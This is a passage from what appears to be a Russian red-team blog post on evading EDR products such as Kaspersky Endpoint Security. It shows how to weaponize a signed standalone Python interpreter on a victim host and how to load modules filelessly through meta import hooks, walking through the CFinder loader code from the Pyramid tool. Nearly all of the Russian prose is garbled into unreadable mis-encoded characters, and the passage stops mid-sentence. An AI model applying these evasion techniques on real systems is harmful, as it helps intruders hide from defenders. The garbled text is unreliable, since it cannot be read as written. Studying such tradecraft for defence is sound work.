1. –°–≤–µ—Å—Ç–∏ –∫ –º–∏–Ω–∏–º—É–º—É —Å–≤–æ–µ –ø—Ä–∏—Å—É—Ç—Å—Ç–≤–∏–µ –Ω–∞ —É–∑–ª–µ, –≥–¥–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω EDR. –î–ª—è —ç—Ç–æ–≥–æ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∏–º–µ—Ç—å SOCKS-–ø—Ä–æ–∫—Å–∏ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ –∂–µ—Ä—Ç–≤—ã –∏ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∏—Ä–æ–≤–∞—Ç—å —á–µ—Ä–µ–∑ –Ω–µ–≥–æ —Ç—Ä–∞—Ñ–∏–∫ –≤–æ –≤–Ω—É—Ç—Ä–µ–Ω–Ω—é—é —Å–µ—Ç—å –∏–ª–∏ –∫ –ª–æ–∫–∞–ª—å–Ω—ã–º —Ä–µ—Å—É—Ä—Å–∞–º –º–∞—à–∏–Ω—ã ([Impacket](https://github.com/SecureAuthCorp/impacket) —Ç–µ–±–µ –≤ –ø–æ–º–æ—â—å).
2. –í—Å—Ç—É–ø–∏—Ç—å –≤ –∞–ø—Ä–∏–æ—Ä–Ω–æ –Ω–µ—Ä–∞–≤–Ω—ã–π –±–æ–π —Å EDR: –∞–Ω—Ö—É–∫–∞—Ç—å –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, –∫—Ä–∏–ø—Ç–æ–≤–∞—Ç—å —Å–≤–æ–π –∞—Ä—Å–µ–Ω–∞–ª –¥–æ –ø–æ—Å–∏–Ω–µ–Ω–∏—è, –∂–∏—Ç—å —Å `sleep 100500`, –≤—ã–ø–æ–ª–Ω—è—è –ø–æ –æ–¥–Ω–æ–π –∫–æ–º–∞–Ω–¥–µ –≤ —Å—É—Ç–∫–∏, –¥—É–º–∞—Ç—å –æ —Ä–∏—Å–∫–∞—Ö –∫–∞–∂–¥–æ–≥–æ –≤–≤–µ–¥–µ–Ω–Ω–æ–≥–æ –≤ –∫–æ–Ω—Å–æ–ª—å —Å–∏–º–≤–æ–ª–∞. –≠—Ç–æ —Å–ª–æ–∂–Ω–æ (—Ç–æ –µ—Å—Ç—å –æ—á–µ–Ω—å). –û–±—ã—á–Ω–æ —ç—Ç–æ –º–æ–∂–Ω–æ —Å–µ–±–µ –ø–æ–∑–≤–æ–ª–∏—Ç—å, –µ—Å–ª–∏ –≤–µ—Å—å —Ç–≤–æ–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞—Ä–∏–π –∫–∞—Å—Ç–æ–º–Ω—ã–π, –Ω–æ –∫–∞–∫ –ª—é–¥–∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç —Ç—É –∂–µ ¬´–ö–æ–±—É¬ª (–∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã–π –Ω–∞ —Ç–µ—Ä—Ä–∏—Ç–æ—Ä–∏–∏ –†–§ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç) –Ω–∞ –ø—Ä–æ–µ–∫—Ç–∞—Ö, —è –ø–æ–∫–∞ —Ç–∞–∫ –∏ –Ω–µ –ø–æ–Ω—è–ª.
3. –û–ø–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –∏–∑ —Å–ª–µ–ø—ã—Ö –∑–æ–Ω EDR. –°—é–¥–∞ –º–æ–∂–Ω–æ –æ—Ç–Ω–µ—Å—Ç–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ª–µ–≥–∏—Ç–∏–º–Ω—ã—Ö —Ç—É–ª–∑ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏—è –∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö —Ü–µ–ª—è—Ö, –Ω–∞–ø—Ä–∏–º–µ—Ä –≤–æ–æ—Ä—É–∂–∏—Ç—å –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π (–∏ –ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–π) –±–∏–Ω–∞—Ä—å Python –¥–ª—è –º–∞–ª–≤–∞—Ä–Ω–æ–≥–æ —Ç—Ä–µ–π–¥–∫—Ä–∞—Ñ—Ç–∞ –ø—Ä—è–º–æ –Ω–∞ –º–∞—à–∏–Ω–µ-–∂–µ—Ä—Ç–≤–µ.

–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –≤–Ω—É—Ç—Ä–∏ –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ—Ä–∞ Python, –∏ –∫–∞–∫ —Ç—Ä–∞–∫—Ç–æ–≤–∞—Ç—å —Ç–µ –∏–ª–∏ –∏–Ω—ã–µ –º–∞—Ä–∫–µ—Ä—ã –µ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏—è? ¬´–ê —á–µ—Ä—Ç –µ–≥–æ –∑–Ω–∞–µ—Ç...¬ª, ‚Äî —Ç–∞–∫ –æ—Ç–≤–µ—Ç—è—Ç –Ω–µ —Ç–æ–ª—å–∫–æ –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –∏–∑ –Ω–∞—Å, –Ω–æ –∏ –º–Ω–æ–≥–∏–µ –≤–µ–Ω–¥–æ—Ä—ã –∑–∞—â–∏—Ç–Ω–æ–≥–æ –ü–û. –î–ª—è –Ω–∞—Å –ø—Ä–µ–ª–µ—Å—Ç—å —ç—Ç–æ–≥–æ —è–∑—ã–∫–∞ –≤ —Ç–æ–º, —á—Ç–æ, –Ω–∞—á–∏–Ω–∞—è —Å –≤–µ—Ä—Å–∏–∏ 3.7, –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–∞—è —Å–±–æ—Ä–∫–∞ –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞ –ø–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è [–≤ standalone-–≤–∏–¥–µ](https://www.python.org/ftp/python/3.10.8/python-3.10.8-embed-amd64.zip), —Ç–æ –µ—Å—Ç—å –Ω–µ —Ç—Ä–µ–±—É–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–∞ —Ö–æ—Å—Ç.

–ö—Ä–æ–º–µ —Ç–æ–≥–æ, –¥–æ —Ç–µ—Ö –ø–æ—Ä, –ø–æ–∫–∞ –º—ã –Ω–µ –≤—ã—Ö–æ–¥–∏–º –∑–∞ –ø—Ä–µ–¥–µ–ª—ã –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞ (—Ç–æ –µ—Å—Ç—å, –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ–º –∏–Ω–∂–µ–∫—Ç—ã –≤ –¥—Ä—É–≥–∏–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –∏–ª–∏ –Ω–µ —Å–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã—Ö), –∏—Å—Ç–æ—á–Ω–∏–∫ –≤—Å–µ–π —Ç–µ–ª–µ–º–µ—Ç—Ä–∏–∏ –∏—Å—Ö–æ–¥–∏—Ç –æ—Ç –ø–æ–¥–ø–∏—Å–∞–Ω–Ω–æ–≥–æ `python.exe`, —á—Ç–æ –Ω–µ –æ–±–ª–µ–≥—á–∞–µ—Ç –∂–∏–∑–Ω—å –∑–∞—â–∏—Ç–Ω–æ–º—É –ü–û, –∫–æ–≥–¥–∞ –¥–µ–ª–æ –¥–æ—Ö–æ–¥–∏—Ç –¥–æ —Ä–∞–∑–±–∏—Ä–∞—Ç–µ–ª—å—Å—Ç–≤, —á—Ç–æ –∏–∑ —ç—Ç–æ–≥–æ –µ—Å—Ç—å —á—Ç–æ.

–ò—Ç–∞–∫, —á—Ç–æ –∂–µ –Ω–∞–º –Ω—É–∂–Ω–æ, —á—Ç–æ–±—ã –≤–æ–æ—Ä—É–∂–∏—Ç—å standalone-–∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä Python?

# –ë–µ–∑—Ñ–∞–π–ª–æ–≤—ã–π –∏–º–ø–æ—Ä—Ç –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π

–î–ª—è –Ω–∞—á–∞–ª–∞ –æ–ø—Ä–µ–¥–µ–ª–∏–º—Å—è, —Ç–∞–∫ –ª–∏ –æ–Ω–æ –Ω–∞–º –Ω–∞–¥–æ ‚Äî –∑–∞–≥—Ä—É–∂–∞—Ç—å –º–æ–¥—É–ª–∏ –ø—Ä—è–º–æ –≤ –ø–∞–º—è—Ç—å? –ß–µ–º –ø–ª–æ—Ö–æ –ø—Ä–∏–Ω–µ—Å—Ç–∏ –∏—Ö –Ω–∞ —Ö–æ—Å—Ç –∏ –ø–æ–ª–æ–∂–∏—Ç—å —Ä—è–¥–æ–º —Å –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–æ–º?

[![impacket-static-analysis.png](/assets/images/python-pyramid/impacket-static-analysis.png)](/assets/images/python-pyramid/impacket-static-analysis.png)
{:.center-image}

–°—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ –ø—Ä–æ—Ç–∏–≤ —Å–æ—Ä—Ü–æ–≤ Impacket
{:.quote}

–ö–∞–∫ –º–æ–∂–Ω–æ –≤–∏–¥–µ—Ç—å, —Ç–∞–∫–æ–π —Ç—Ä—é–∫ —É –Ω–∞—Å –Ω–µ –ø—Ä–æ–∫–∞—Ç–∏—Ç. –î–∞ –∏ –≤–æ–æ–±—â–µ —Å–æ—Ö—Ä–∞–Ω—è—Ç—å —á—Ç–æ-–ª–∏–±–æ –Ω–∞ –¥–∏—Å–∫ ‚Äî –ø–ª–æ—Ö–∞—è –ø—Ä–∞–∫—Ç–∏–∫–∞. –ö–æ–≥–¥–∞ –µ—Å—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å, –ª—É—á—à–µ –≤—Å–µ–≥–¥–∞ —ç—Ç–æ–≥–æ –∏–∑–±–µ–≥–∞—Ç—å.

## –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ –∫–∞—Å–∞—Ç–µ–ª—å–Ω–æ –≤–µ–Ω–¥–æ—Ä–∞ AV

–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –º—ã —Å–Ω–æ–≤–∞ –±—É–¥–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ä–µ—à–µ–Ω–∏–µ Kaspersky Endpoint Security –≤ –∫–∞—á–µ—Å—Ç–≤–µ –º–µ—Ä–∏–ª–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –Ω–∞—à–∏—Ö —ç–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–æ–≤. –ß—Ç–æ–±—ã –Ω–µ –±—ã–ª–æ –æ–±–≤–∏–Ω–µ–Ω–∏–π –≤ –ø—Ä–µ–¥–≤–∑—è—Ç–æ—Å—Ç–∏ –∏–ª–∏ –¥–æ–º—ã—Å–ª–æ–≤ –æ —Ç–æ–º, —á—Ç–æ —É –º–µ–Ω—è –∫–∞–∫–∏–µ-—Ç–æ –ª–∏—á–Ω—ã–µ —Å—á–µ—Ç—ã —Å —ç—Ç–∏–º –ø—Ä–æ–¥—É–∫—Ç–æ–º (—Ç–∞–∫ –∫–∞–∫ –æ–Ω —É–∂–µ –Ω–µ –≤ –ø–µ—Ä–≤—ã–π —Ä–∞–∑ –≤—Å—Ç—Ä–µ—á–∞–µ—Ç—Å—è –≤ –º–æ–∏—Ö —Ç–µ–∫—Å—Ç–∞—Ö), —è —Å—Ä–∞–∑—É —Ä–∞—Å—Å—Ç–∞–≤–ª—é –≤—Å–µ —Ç–æ—á–∫–∏ –Ω–∞–¥ **i**:

1. –ò—Å—Ö–æ–¥—è –∏–∑ –º–æ–µ–≥–æ –ª–∏—á–Ω–æ–≥–æ –æ–ø—ã—Ç–∞ KES ‚Äî –ª—É—á—à–µ–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ –≤ —Ä—É-—Å–µ–≥–º–µ–Ω—Ç–µ, –≤—Å–ª–µ–¥—Å—Ç–≤–∏–µ —á–µ–≥–æ –ª–æ–≥–∏–∫–∞ –µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω—ã—Ö –∏—Å–ø—ã—Ç–∞–Ω–∏—è—Ö –æ—á–µ–≤–∏–¥–Ω–∞: –æ–±–æ–π–¥–µ—à—å –µ–≥–æ, –∑–Ω–∞—á–∏—Ç, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ –æ–±–æ–π–¥–µ—à—å –ø—Ä–æ–¥—É–∫—Ç—ã –¥—Ä—É–≥–∏—Ö –≤–µ–Ω–¥–æ—Ä–æ–≤, –∫–æ–≥–¥–∞ –æ–Ω–∏ –≤—Å—Ç—Ä–µ—Ç—è—Ç—Å—è –Ω–∞ –ø—Ä–æ–µ–∫—Ç–µ.
2. –ß–∞—â–µ –≤—Å–µ–≥–æ, –∫–∞–∫ –Ω–∞ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏—Ö –ø–µ–Ω—Ç–µ—Å—Ç–∞—Ö, —Ç–∞–∫ –∏ –≤ —Ö–æ–¥–µ –æ–ø–µ—Ä–∞—Ü–∏–π Red Team, –º—ã –≤—Å—Ç—Ä–µ—á–∞–µ–º—Å—è –∏–º–µ–Ω–Ω–æ —Å KES, –ø–æ—ç—Ç–æ–º—É –æ–ø—è—Ç—å –∂–µ —Ü–µ–ª–µ—Å–æ–æ–±—Ä–∞–∑–Ω–æ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç—å –∏–º–µ–Ω–Ω–æ –µ–≥–æ —Ä–µ–∞–∫—Ü–∏—é –Ω–∞ ¬´–≤–Ω–µ—à–Ω–∏–µ —Ä–∞–∑–¥—Ä–∞–∂–∏—Ç–µ–ª–∏¬ª, —á—Ç–æ–±—ã –∑–Ω–∞—Ç—å, —á–µ–≥–æ –æ–∂–∏–¥–∞—Ç—å –≤ —Ö–æ–¥–µ –Ω–∞—à–∏—Ö —Ä–∞–±–æ—Ç.

–ö —Ç–æ–º—É –∂–µ —è –∑–Ω–∞—é, —á—Ç–æ –∫–æ–ª–ª–µ–≥–∏ ¬´–ø–æ —Ç—É —Å—Ç–æ—Ä–æ–Ω—É¬ª –¥–µ—Ñ–µ–Ω—Å–∞ –∏–Ω–æ–≥–¥–∞ –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—é—Ç –º–æ–∏ –∫–∞–ª—è–∫–∏, –ø–æ—ç—Ç–æ–º—É, –≤–æ–∑–º–æ–∂–Ω–æ, —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º —è —Ç–æ–∂–µ –≤–Ω–æ—à—É —Å–≤–æ–π –º–∞–ª–µ–Ω—å–∫–∏–π –≤–∫–ª–∞–¥ –≤ —Ä–∞–∑–≤–∏—Ç–∏–µ —ç—Ç–æ–≥–æ –ø—Ä–æ–¥—É–∫—Ç–∞.

–í—Å—è –º–∞–≥–∏—è –±–µ–∑—Ñ–∞–π–ª–æ–≤–æ–≥–æ –∏–º–ø–æ—Ä—Ç–∞ –≤–Ω–µ—à–Ω–∏—Ö –º–æ–¥—É–ª–µ–π –≤ Python –∫—Ä–æ–µ—Ç—Å—è –≤ —Ñ–∏—á–µ **Meta Import Hooks**, –≤–≤–µ–¥–µ–Ω–Ω–æ–π –Ω–µ–∫–æ–≥–¥–∞ [–í–µ–ª–∏–∫–æ–¥—É—à–Ω—ã–º –ø–æ–∂–∏–∑–Ω–µ–Ω–Ω—ã–º –¥–∏–∫—Ç–∞—Ç–æ—Ä–æ–º](https://ru.wikipedia.org/wiki/–í–µ–ª–∏–∫–æ–¥—É—à–Ω—ã–π_–ø–æ–∂–∏–∑–Ω–µ–Ω–Ω—ã–π_–¥–∏–∫—Ç–∞—Ç–æ—Ä) –ì–≤–∏–¥–æ –≤–∞–Ω –†–æ—Å—Å—É–º–æ–º [–≤ —Ä–µ–≤–∏–∑–∏–∏ 302 —Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–∞ PEP](https://peps.python.org/pep-0302/). –í —ç—Ç–æ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ Meta hooks ‚Äî —ç—Ç–æ —Å–ø–æ—Å–æ–± —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –∏–º–ø–æ—Ä—Ç–∞, —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–π –≤ –≤–∏–¥–µ –∫–ª–∞—Å—Å–∞ –∏ —Å—Ç—Ä–µ–ª—è—é—â–∏–π –≤ —Å–∞–º–æ–º –Ω–∞—á–∞–ª–µ –∞–ª–≥–æ—Ä–∏—Ç–º–∞ –ø–æ–∏—Å–∫–∞ –º–æ–¥—É–ª—è. –î–ª—è —Å—Ä–∞–≤–Ω–µ–Ω–∏—è –µ—Å—Ç—å –¥—Ä—É–≥–æ–π —Å–ø–æ—Å–æ–± –¥–ª—è –∏–º–ø–æ—Ä—Ç–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π ‚Äî **Path Import Hooks** ‚Äî –∫–æ—Ç–æ—Ä—ã–π, –∫–∞–∫ –º–æ–∂–Ω–æ –¥–æ–≥–∞–¥–∞—Ç—å—Å—è –ø–æ –Ω–∞–∑–≤–∞–Ω–∏—é, –æ—Å–Ω–æ–≤–∞–Ω –Ω–∞ –ø–æ–∏—Å–∫–µ –Ω—É–∂–Ω–æ–≥–æ –ü–∏—Ç–æ–Ω—É –º–æ–¥—É–ª—è –ø–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–º –ø—É—Ç—è–º, –∑–∞—Ä–∞–Ω–µ–µ –∏–∑–≤–µ—Å—Ç–Ω—ã–º –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä—É.

–¢–µ–∫—É—â–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è Meta hooks –º–æ–∂–Ω–æ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π `sys.meta_path`, Path hooks ‚Äî –≤ `sys.path`.

[![python-import-hooks.png](/assets/images/python-pyramid/python-import-hooks.png)](/assets/images/python-pyramid/python-import-hooks.png)
{:.center-image}

–°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è Import hooks –¥–ª—è Embeddable Python
{:.quote}

–¢–æ –µ—Å—Ç—å –≤—Å–µ, —á—Ç–æ –Ω–∞–º –Ω—É–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å ‚Äî —ç—Ç–æ –Ω–∞–ø–∏—Å–∞—Ç—å —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π –∫–ª–∞—Å—Å –∏–º–ø–æ—Ä—Ç–µ—Ä–∞ –º–æ–¥—É–ª–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –±—É–¥–µ–º –ø–æ–ª—É—á–∞—Ç—å –≤ –≤–∏–¥–µ –∞—Ä—Ö–∏–≤–æ–≤, –Ω–∞–ø—Ä–∏–º–µ—Ä, –ø–æ HTTP, –∏ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å –µ–≥–æ –∫–∞–∫ Meta hook, –∏–∑–∏!

–†–∞–∑–±–µ—Ä–µ–º —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é —Ç–∞–∫–æ–≥–æ –∫–ª–∞—Å—Å–∞ –≤ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–µ Pyramid.

## CFinder

–ö–∞–∫ –∏–∑–≤–µ—Å—Ç–Ω–æ, –≤—Å–µ –Ω–æ–≤–æ–µ ‚Äî —ç—Ç–æ —Ö–æ—Ä–æ—à–æ –∑–∞–±—ã—Ç–æ–µ —Å—Ç–∞—Ä–æ–µ, –ø–æ—ç—Ç–æ–º—É —Ü–µ–ø–æ—á–∫–∞ –∑–∞–∏–º—Å—Ç–≤–æ–≤–∞–Ω–∏—è –∫–ª–∞—Å—Å–∞ [CFinder](https://github.com/naksyn/Pyramid/blob/7f1a839e9667d1c5a5c32fddfad3d353d8410682/Server/base-impacket-secretsdump.py#L73-L158) (Custom Finder) —Ç—è–Ω–µ—Ç—Å—è –∞–∂ —Å 2015 –≥–æ–¥–∞: –∏–∑ –ø—Ä–æ–µ–∫—Ç–∞ [remote_importer](https://github.com/sulinx/remote_importer/blob/148f5e5ce84658df94063a4909d5eb3ace87695e/remote_importer.py#L20-L117) –æ–Ω –±—ã–ª –ø–æ–∑–∞–∏–º—Å—Ç–≤–æ–≤–∞–Ω –∫–æ–º–∞–Ω–¥–æ–π EmpireProject –≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –°2-–∞–≥–µ–Ω—Ç–∞ [EmPyre](https://github.com/EmpireProject/EmPyre/blob/c73854ed9d90d2bba1717d3fe6df758d18c20b8f/data/agent/agent.py#L483-L565) –∏ –¥–∞–ª–µ–µ –º–µ–ª—å–∫–∞–ª –≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –¥—Ä—É–≥–∏—Ö –Ω–∞—Å—Ç—É–ø–∞—Ç–µ–ª—å–Ω—ã—Ö —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∞—Ö.

–ü–æ–π–¥–µ–º —Å–≤–µ—Ä—Ö—É –≤–Ω–∏–∑, –Ω–∞—á–∞–≤ —Å–æ –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã—Ö –º–µ—Ç–æ–¥–æ–≤.

### CFinder.\_get\_info

```python
class CFinder():

	def __init__(self, repo_name):
		self.repo_name = repo_name
		self._source_code = {}

	def _get_info(self, repo_name, full_name):
		parts = full_name.split('.')
		submodule = parts[-1]
		module_path = '/'.join(parts)

		for suffix, is_package in (('.py', False), ('/__init__.py', True)):
			relative_path = module_path + suffix
			try:
				ZIPPED[repo_name].getinfo(relative_path)
			except KeyError:
				continue
			else:
				return submodule, is_package, relative_path

		raise ImportError(f'Unable to locate module {submodule} in the {repo_name} repo')
```

–ö–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –∏–º—è –º–æ–¥—É–ª—è, –∫–æ—Ç–æ—Ä—ã–π –º—ã —Ö–æ—Ç–∏–º –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å, –∞ –º–µ—Ç–æ–¥ `_get_info` –æ—Ç–¥–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–∏ —Ç–æ–≥–æ –∏–ª–∏ –∏–Ω–æ–≥–æ –ø–∏—Ç–æ–Ω—è—á–µ–≥–æ —Ñ–∞–π–ª–∞ –≤ –∞—Ä—Ö–∏–≤–µ ZIP. –ï—Å–ª–∏ –≤ —Ö–æ–¥–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—á–µ—Ä–µ–¥–Ω–æ–≥–æ –∏—Å—Ö–æ–¥–Ω–∏–∫–∞, –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä –Ω–∞—Ç–∫–Ω–µ—Ç—Å—è –Ω–∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é `import <–ò–ú–Ø_–ú–û–î–£–õ–Ø>` (–ø—Ä–∏—á–µ–º –Ω–µ–≤–∞–∂–Ω–æ, –≤ –≤–µ—Ä—Ö–Ω–µ—É—Ä–æ–≤–Ω–µ–≤–æ–º —Å–∫—Ä–∏–ø—Ç–µ –∏–ª–∏ –≤ –∏–º–ø–æ—Ä—Ç–∞—Ö –¥—Ä—É–≥–∏—Ö –º–æ–¥—É–ª–µ–π), –∏ –¥—Ä—É–≥–∏–µ –∏–º–ø–æ—Ä—Ç–µ—Ä—ã –Ω–µ —Å–º–æ–≥—É—Ç —Å –Ω–µ–π —Å–ø—Ä–∞–≤–∏—Ç—å—Å—è, —ç—Ç–æ—Ç –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–π –º–µ—Ç–æ–¥ –ø–æ–ø—ã—Ç–∞–µ—Ç—Å—è —Ä–∞–∑—Ä–µ—à–∏—Ç—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å —Å–Ω–∞—á–∞–ª–∞ –ø–æ –ø—É—Ç–∏ `–ê–†–•–ò–í ‚Üí <–ò–ú–Ø_–ú–û–î–£–õ–Ø>.py`, –∞ –ø–æ—Ç–æ–º –ø–æ –ø—É—Ç–∏ `–ê–†–•–ò–í ‚Üí <–ò–ú–Ø_–ú–û–î–£–õ–Ø>/__init__.py`, –µ—Å–ª–∏ –ø–µ—Ä–≤–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø—Ä–æ–≤–∞–ª–∏–ª–∞—Å—å.

–î–ª—è –Ω–∞–≥–ª—è–¥–Ω–æ—Å—Ç–∏ —è –≤–æ–∑—å–º—É –ø—Ä–æ—Å—Ç–æ–π –∏ –≤—Å–µ–º –∏–∑–≤–µ—Å—Ç–Ω—ã–π –º–æ–¥—É–ª—å [colorama](https://github.com/tartley/colorama), –¥–æ–±–∞–≤–ª—é –≤–æ—Ç —Ç–∞–∫—É—é —Å—Ç—Ä–æ—á–∫—É –ø–µ—Ä–µ–¥ –∫–ª—é—á–µ–≤—ã–º —Å–ª–æ–≤–æ–º `return`:

```python
print(submodule, is_package, relative_path)
```
    
–ó–∞—Ç–µ–º –∑–∞–≥—Ä—É–∂—É –º–æ–¥—É–ª—å –∏–∑ –ø–∞–º—è—Ç–∏. –î–µ—Ç–∞–ª–∏ –∑–∞–≥—Ä—É–∑–∫–∏ –Ω–∞–º –ø–æ–∫–∞ –Ω–µ–∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã, –ø—Ä–æ—Å—Ç–æ –ø–æ—Å–º–æ—Ç—Ä–∏–º –Ω–∞ –≤—ã–≤–æ–¥ `print`.

[![colorama-get-info.png](/assets/images/python-pyramid/colorama-get-info.png)](/assets/images/python-pyramid/colorama-get-info.png)
{:.center-image}

–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∏–º–ø–æ—Ä—Ç–∞—Ö –≤ –º–æ–¥—É–ª–µ colorama
{:.quote}

–í–∏–¥–∏–º, —á—Ç–æ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–±–æ –≤—Å–µ—Ö –∏–º–ø–æ—Ä—Ç–∞—Ö –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –º–æ–¥—É–ª—è colorama —Ä–∞–∑—Ä–µ—à–∏–ª–∏—Å—å —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ. –ò–¥–µ–º –¥–∞–ª—å—à–µ.

### CFinder.\_get\_source

```python
def _get_source_code(self, repo_name, full_name):
	submodule, is_package, relative_path = self._get_info(repo_name, full_name)

	full_path = f'{repo_name}/{relative_path}'
	if relative_path in self._source_code:
		code = self._source_code[relative_path]
		return submodule, is_package, full_path, code

	try:
		code = ZIPPED[repo_name].read(relative_path).decode()
		code = code.replace('\r\n', '\n').replace('\r', '\n')
		self._source_code[relative_path] = code
		return submodule, is_package, full_path, code
	except:
		raise ImportError(f'Unable to obtain source code for module {full_path}')
```

–í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–π –º–µ—Ç–æ–¥ `_get_source_code` –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ —Å –∏—Å–∫–æ–º—ã–º –∏—Å—Ö–æ–¥–Ω–∏–∫–æ–º, –∫–æ—Ç–æ—Ä—ã–π —Ç—Ä–µ–±—É–µ—Ç—Å—è –≤ —Ö–æ–¥–µ –∏–º–ø–æ—Ä—Ç–∞, —Å –ø–æ–º–æ—â—å—é —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–Ω–æ–≥–æ –≤—ã—à–µ –º–µ—Ç–æ–¥–∞ `_get_info`. –ü–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ —Ñ–∞–π–ª –Ω–∞–π–¥–µ–Ω, –º—ã –ª–µ–∑–µ–º –∑–∞ –Ω–∏–º –ø–æ –æ—Ç–¥–∞–Ω–Ω–æ–º—É –ø—É—Ç–∏ –≤ ZIP-–∞—Ä—Ö–∏–≤, —á–∏—Ç–∞–µ–º –µ–≥–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∏ –æ—Ç–¥–∞–µ–º –≤ –∫–∞—á–µ—Å—Ç–≤–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ –≤–º–µ—Å—Ç–µ —Å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π 